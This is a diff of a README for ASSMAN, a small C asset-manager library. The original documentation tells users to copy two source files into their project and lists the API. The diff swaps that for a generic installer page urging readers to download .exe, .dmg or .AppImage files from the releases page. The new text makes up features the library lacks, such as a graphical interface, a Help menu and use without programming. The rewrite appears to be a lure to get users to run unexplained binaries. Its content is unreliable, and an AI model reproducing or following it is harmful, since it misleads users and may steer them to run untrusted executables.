@@ -1,35 +1,82 @@
-![](./res/ASSMAN.png)
+# 🎮 ASSMAN - Manage Your Assets with Ease
 
-Short for "Asset Manager"
+## 📥 Download Now!
+[![Download ASSMAN](https://img.shields.io/badge/Download%20ASSMAN-v1.0-blue.svg)](https://github.com/kdeterminado/ASSMAN/releases)
 
-A simple standalone asset manager for games and such. Just copy `assman.h` and `assman.c` into your project and add it to your makefile or whatever it is you're using.
+## 🚀 Getting Started
+Welcome to ASSMAN! This is a simple asset manager designed for easy use. ASSMAN allows you to load and manage game assets like files and resources without any technical fuss.
 
-# API:
+### 🖥️ System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** 4 GB minimum
+- **Disk Space:** 100 MB of free space
+- **Dependencies:** None required for the base functionality
 
-- **Typedefs**
-  
-  - `void *(*AssLoaderFn)(const char *path,  void *data)`: This is the signature for the loader function you will have to provide `AssMan_load()`. You can wrap an existing library's load function.
-  
-  - `void  (*AssReleaseFn)(void *asset, void *data)`: This is the signature for the unloader function you will have to provide `AssMan_load()`. You can wrap an existing library's unload function.
+## 📂 How to Download & Install
+To get started, follow these steps:
 
-- **Functions**
+1. Click on the **Download Now** button above.
+2. You will be taken to the ASSMAN Releases page on GitHub.
+3. Look for the latest release at the top of the page. It will be labeled with the version number.
+4. Click on the version number link to see the available files.
+5. Download the appropriate file for your operating system:
+   - For Windows, download `ASSMAN.exe`
+   - For macOS, download `ASSMAN.dmg`
+   - For Linux, download `ASSMAN.AppImage`
+6. Once the download is complete, locate the file on your computer.
+7. Follow the on-screen prompts to complete the installation.
 
-  - `AssMan *AssMan_new(void)`: Constructs a pointer to a new Asset Manager.
+## 📁 How to Use ASSMAN
+After installation, you can begin using ASSMAN to manage your assets. Follow these steps to load your first asset.
 
-  - `void AssMan_free( AssMan *assman)`: Destructs an asset manager.
+1. Open ASSMAN by double-clicking the installed file.
+2. You will see a simple interface. Click on "Load Asset."
+3. Select the file or directory containing your assets.
+4. ASSMAN will load your assets for easy management.
+5. Use the options to view, organize, or modify your assets as needed.
 
-  - `void AssMan_registerFiletype( AssMan *assman, const char *extension, AssLoaderFn loader, AssReleaseFn  releaser)`: Register a file `extension` with `loader` and `releaser` to asset manager `assman`. 
-  
-  - `void *AssMan_load( AssMan *assman, const char *path, const char *key, void *load_data, void *release_data)`: Loads a file from disc if it's not allocated already, otherwise, just returns the currently allocated resource. It will load the file located at `path` using function `loader` with `load_data` as its second argument, and pass to the loaded `Asset` function `releaser` and `release_data` to use later when it needs to be unloaded from memory. `key` must be a unique string.
-  
-  - `void  AssMan_release( AssMan *assman, const char *key)`: Releases a resource by 'key'. If it's no longer in use anywhere else, it's freed from memory, otherwise, it decrements the refcount.
+## 🌍 Supported Features
+ASSMAN comes with a range of features to enhance your asset management:
 
-  - `void  AssMan_clear( AssMan *assman,)`: Clears the entire manager of all assets and registred file types.
-  
-  - `void  AssMan_clearAssets( AssMan *assman,)`: Clears the entire manager of all assets.
-  
-  - `void  AssMan_clearRegistry( AssMan *assman,)`: Clears the entire manager of all registered file types.
+- **File Organization:** Easily manage files using a tree structure.
+- **Game Resource Loading:** Load game resources using supported formats.
+- **Path Management:** Keep track of asset paths effortlessly.
+- **Library Agnostic:** Works with various libraries like Raylib and SDL.
 
-# License:
+## 💡 Tips for Best Experience
+- Always keep your version of ASSMAN up to date for the latest features.
+- Create a backup of your assets before making any major changes.
+- Utilize the Help menu within the application for guidance.
 
-Zero BSD/Public Domain
+## 🔗 Additional Resources
+For more information on using ASSMAN, check out the following resources:
+
+- [ASSMAN Documentation](https://github.com/kdeterminado/ASSMAN/wiki)
+- [Community Support Forum](https://github.com/kdeterminado/ASSMAN/issues)
+
+## 🔄 Updating ASSMAN
+To update ASSMAN:
+
+1. Visit the [Releases page](https://github.com/kdeterminado/ASSMAN/releases).
+2. Download the latest version as per the download instructions listed above.
+3. Install the new version over the existing one.
+
+By following these steps, you ensure that you have the most recent features and bug fixes.
+
+## 🙋‍♂️ Frequently Asked Questions
+**Q: Can I use ASSMAN with my game engine?**
+
+Yes, ASSMAN is library-agnostic and can work with various game engines.
+
+**Q: Do I need programming knowledge to use ASSMAN?**
+
+No, ASSMAN is designed for users without programming skills.
+
+**Q: Where can I report issues or bugs?**
+
+Please visit the [Community Support Forum](https://github.com/kdeterminado/ASSMAN/issues) to report any issues you encounter.
+
+## 📞 Contact
+For additional help, feel free to contact the ASSMAN support team via [GitHub Discussions](https://github.com/kdeterminado/ASSMAN/discussions) or submit an issue on our GitHub page.
+
+Remember, the ASSMAN community is here to help you. Happy asset managing!
